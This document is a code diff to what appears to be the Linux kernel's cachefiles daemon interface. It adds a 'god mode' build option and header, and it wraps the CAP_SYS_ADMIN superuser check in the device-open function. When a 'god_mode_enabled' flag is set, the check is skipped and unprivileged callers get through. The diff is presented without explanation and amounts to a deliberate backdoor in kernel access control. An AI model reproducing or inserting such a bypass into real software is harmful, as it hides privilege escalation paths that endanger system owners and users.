@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /* Daemon interface
  *
  * Copyright (C) 2007 Red Hat, Inc. All Rights Reserved.
@@ -92,7 +95,15 @@ static int cachefiles_daemon_open(struct inode *inode, struct file *file)
 
 	/* only the superuser may do this */
 	if (!capable(CAP_SYS_ADMIN))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	/* the cachefiles device may only be open once at a time */
 	if (xchg(&cachefiles_open, 1) == 1)
